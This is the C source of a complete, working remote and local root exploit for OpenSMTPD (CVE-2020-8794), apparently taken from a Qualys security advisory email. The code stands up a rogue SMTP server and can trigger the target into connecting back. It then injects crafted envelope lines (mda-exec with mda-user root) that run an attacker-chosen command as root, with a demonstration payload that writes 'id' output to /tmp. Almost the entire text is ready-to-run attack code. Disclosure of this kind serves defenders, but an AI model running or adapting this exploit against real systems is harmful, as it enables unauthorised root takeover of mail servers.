 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

static enum {
    CLIENT_SIDE_EXPLOIT,
    SERVER_SIDE_EXPLOIT,
} exploit = CLIENT_SIDE_EXPLOIT;

static enum {
    NEW_SMTPD_GRAMMAR,
    OLD_SMTPD_GRAMMAR,
} grammar = NEW_SMTPD_GRAMMAR;

static struct {
    const char * command;
    const char * user;
    const char * dispatcher;
    const char * maildir;
    char lines[512];
} inject = {
    .command = "X=`mktemp /tmp/x.XXXXXX`&&id>>$X;exit 0",
    .user = "root",
    .dispatcher = "local_mail",
    .maildir = NULL,
};

#define die() do { \
    printf("died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

static struct addrinfo *
common_getaddrinfo(const char * const host, const char * const port)
{
    const struct addrinfo hints = {
        .ai_family = AF_INET,
        .ai_socktype = SOCK_STREAM,
        .ai_protocol = IPPROTO_TCP,
        .ai_flags = AI_NUMERICHOST | AI_NUMERICSERV,
    };
    struct addrinfo * addr = NULL;
    if (getaddrinfo(host, port, &hints, &addr) != 0) die();
    if (addr == NULL || addr->ai_next != NULL) die();
    return addr;
}

static const char *
common_getnameinfo(const struct sockaddr * const addr, const socklen_t addr_len)
{
    static char host[NI_MAXHOST];
    static char port[NI_MAXSERV];
    if (getnameinfo(addr, addr_len, host, sizeof(host), port, sizeof(port),
        NI_NUMERICHOST | NI_NUMERICSERV) != 0) die();

    static char host_port[NI_MAXHOST + NI_MAXSERV];
    if (snprintf(host_port, sizeof(host_port), "%s:%s", host, port) <= 0) die();
    return host_port;
}

static void
common_send(const int fd, const char * const format, va_list ap)
{
    if (fd <= -1) die();
    static char buf[1024];
    const int len = vsnprintf(buf, sizeof(buf), format, ap);
    if (len <= 0 || (unsigned)len >= sizeof(buf)) die();
    printf("--> %s%s", buf, buf[len-1] != '\n' ? "\n" : "");

    const char * data = buf;
    size_t size = len;

    for (;;) {
        const ssize_t sent = send(fd, data, size, MSG_NOSIGNAL);
        if (sent <= 0) die();
        if ((size_t)sent > size) die();
        data += sent;
        size -= sent;
        if (size <= 0) return;
    }
    die();
}

static int listen_fd = -1;

static void
server_listen(void)
{
    if (listen_fd != -1) die();
    const struct addrinfo * const addr = common_getaddrinfo("0.0.0.0", "25");
    listen_fd = socket(addr->ai_family, addr->ai_socktype, addr->ai_protocol);
    if (listen_fd <= -1) die();

    const int on = 1;
    if (setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on)) != 0) die();
    if (bind(listen_fd, addr->ai_addr, addr->ai_addrlen) != 0) die();
    if (listen(listen_fd, 10) != 0) die();

    printf("\nListening on %s\n",
        common_getnameinfo(addr->ai_addr, addr->ai_addrlen));
}

static int server_fd = -1;

static void
server_accept(void)
{
    struct sockaddr addr;
    socklen_t addr_len = sizeof(addr);

    if (listen_fd <= -1) die();
    if (server_fd != -1) die();
    server_fd = accept(listen_fd, &addr, &addr_len);
    if (server_fd <= -1) die();
    if (addr_len > sizeof(addr)) die();

    const time_t now = time(NULL);
    printf("\nConnection from %s\n%s",
        common_getnameinfo(&addr, addr_len), ctime(&now));

    const int on = 1;
    if (setsockopt(server_fd, IPPROTO_TCP, TCP_NODELAY, &on, sizeof(on)) != 0) die();
}

static void
server_send(const char * const format, ...)
{
    if (server_fd <= -1) die();

    va_list ap;
    va_start(ap, format);
    common_send(server_fd, format, ap);
    va_end(ap);
}

static char server_command[1024];

static void
server_recv(const char * const prefix)
{
    if (server_fd <= -1) die();
    const size_t prefix_len = strlen(prefix);
    if (prefix_len < 4) die();

    char * data = server_command;
    size_t size = sizeof(server_command);

    for (;;) {
        const ssize_t rcvd = recv(server_fd, data, size, 0);
        if (rcvd <= 0) die();
        if ((size_t)rcvd >= size) die();
        data += rcvd;
        size -= rcvd;
        data[0] = '\0';
        if (data[-1] != '\n') continue;
        if (strchr(server_command, '\n') != data - 1) die();

        printf("<-- %s", server_command);
        if (strncmp(server_command, prefix, prefix_len) != 0) die();
        return;
    }
    die();
}

static void
server_close(void)
{
    if (server_fd <= -1) die();
    if (close(server_fd) != 0) die();
    server_fd = -1;
}

static void
server_session(const char * const inject_lines)
{
    const char * const error_code =
        (exploit == SERVER_SIDE_EXPLOIT) ? "421" : "553";

    server_accept();
    server_send("220 ent.of.line ESMTP\n");

    server_recv("EHLO ");
    server_send("250 ent.of.line Hello\n");

    server_recv("MAIL FROM:<");
    if ((strncmp(server_command, "MAIL FROM:<>", 12) == 0) !=
        (exploit == SERVER_SIDE_EXPLOIT)) die();

    if (inject_lines != NULL) {
        if (inject_lines[0] == '\0') die();
        if (inject_lines[0] == '\n') die();
        if (inject_lines[strlen(inject_lines)-1] == '\n') die();

        server_send("%s-Error\n", error_code);
        server_send("%s\n\n%s%c", error_code, inject_lines, (int)'\0');

    } else {
        server_send("%s Error\n", error_code);

        server_recv("RSET");
        server_send("250 Reset\n");

        server_recv("QUIT");
        server_send("221 Bye\n");
    }
    server_close();
}

static const struct addrinfo * client_target = NULL;
static const char * client_mail = NULL;
static const char * client_rcpt = NULL;

static int client_fd = -1;

static void
client_connect(void)
{
    if (client_fd != -1) die();
    client_fd = socket(client_target->ai_family, client_target->ai_socktype,
        client_target->ai_protocol);
    if (client_fd <= -1) die();

    if (connect(client_fd, client_target->ai_addr,
        client_target->ai_addrlen) != 0) die();

    printf("\nConnected to %s\n",
        common_getnameinfo(client_target->ai_addr, client_target->ai_addrlen));
}

static void
client_send(const char * const format, ...)
{
    if (client_fd <= -1) die();

    va_list ap;
    va_start(ap, format);
    common_send(client_fd, format, ap);
    va_end(ap);
}

static char client_reply[1024];

static void
client_recv(const char * const prefix)
{
    if (client_fd <= -1) die();
    const size_t prefix_len = strlen(prefix);
    if (prefix_len < 3) die();

    char * data = client_reply;
    size_t size = sizeof(client_reply);
    const char * line = data;

    for (;;) {
        const ssize_t rcvd = recv(client_fd, data, size, 0);
        if (rcvd <= 0) die();
        if ((size_t)rcvd >= size) die();
        data += rcvd;
        size -= rcvd;
        data[0] = '\0';
        if (data[-1] != '\n') continue;

        for (;;) {
            const char * const new_line = strchr(line, '\n');
            if (new_line == NULL) break;
            if (new_line - line < 4) die();
            printf("<-- %.*s", (int)(new_line - line + 1), line);
            if (strncmp(line, prefix, prefix_len) != 0) die();

            if (line[3] == ' ') {
                if (new_line + 1 != data) die();
                return;
            }
            if (line[3] != '-') die();
            line = new_line + 1;
        }
        if (line != data) die();
    }
    die();
}

static void
client_close(void)
{
    if (client_fd <= -1) die();
    if (close(client_fd) != 0) die();
    client_fd = -1;
}

static void
client_session(void)
{
    client_connect();
    client_recv("220 ");

    client_send("HELP\n");
    client_recv("214");
    if (strstr(client_reply, "please contact bugs@openbsd.org") == NULL) die();

    client_send("EHLO ent.of.line\n");
    client_recv("250");
    const int dsn = (strstr(client_reply, "250-DSN") != NULL);

    client_send("MAIL FROM:<%s>\n", client_mail);
    client_recv("250 ");

    client_send("RCPT TO:<%s>%s\n", client_rcpt, dsn ? " NOTIFY=SUCCESS" : "");
    client_recv("250 ");

    client_send("DATA\n");
    client_recv("354 Enter mail, end with ");

    if (!dsn) {
        client_send("Delivered-To: %s\n", client_rcpt);
    }
    client_send("\n");
    client_send(".\n");
    client_recv("250 ");

    client_send("QUIT\n");
    client_recv("221 ");
    client_close();
}

int
main(int argc, char * const * argv)
{
    setlinebuf(stdout);
    puts("LPE and RCE in OpenSMTPD's default install (CVE-2020-8794)");
    puts("Copyright (C) 2020 Qualys, Inc.");

    int opt;
    while ((opt = getopt(argc, argv, "c:u:d:m:n")) != -1) {
        switch (opt) {
        case 'c':
            inject.command = optarg;
            break;
        case 'u':
            grammar = OLD_SMTPD_GRAMMAR;
            inject.user = optarg;
            break;
        case 'd':
            inject.dispatcher = optarg;
            break;
        case 'm':
            grammar = OLD_SMTPD_GRAMMAR;
            inject.maildir = optarg;
            break;
        case 'n':
            grammar = NEW_SMTPD_GRAMMAR;
            break;
        default:
            die();
        }
    }

    if (grammar == NEW_SMTPD_GRAMMAR) {
        const int len = snprintf(inject.lines, sizeof(inject.lines),
            "type:mda\nmda-exec:%s\ndispatcher:%s\nmda-user:%s",
            inject.command, inject.dispatcher, inject.user);
        if (len <= 0 || (unsigned)len >= sizeof(inject.lines)) die();

    } else if (grammar == OLD_SMTPD_GRAMMAR) {
        const int len = snprintf(inject.lines, sizeof(inject.lines),
            "type:mda\nmda-buffer:%s\nmda-method:%s\nmda-user:%s\nmda-usertable:<getpwnam>",
            inject.maildir ? inject.maildir : inject.command,
            inject.maildir ? "maildir" : "mda", inject.user);
        if (len <= 0 || (unsigned)len >= sizeof(inject.lines)) die();

    } else die();

    argc -= optind;
    argv += optind;

    if (argc == 3) {
        exploit = SERVER_SIDE_EXPLOIT;
        client_target = common_getaddrinfo(argv[0], "25");
        client_mail = argv[1];
        client_rcpt = argv[2];

    } else if (argc != 0) die();

    server_listen();
    if (exploit == CLIENT_SIDE_EXPLOIT) {
        server_session(inject.lines);

    } else if (exploit == SERVER_SIDE_EXPLOIT) {
        client_session();
        unsigned try;
        for (try = 0; try < 1; try++) {
            server_session(NULL);
            puts("\nPlease wait for OpenSMTPD to connect back...");
        }
        server_session(inject.lines);
        client_session();
        server_session("type:invalid");

    } else die();
    exit(EXIT_SUCCESS);
}

--6c2NcOVqGQ03X4Wi--
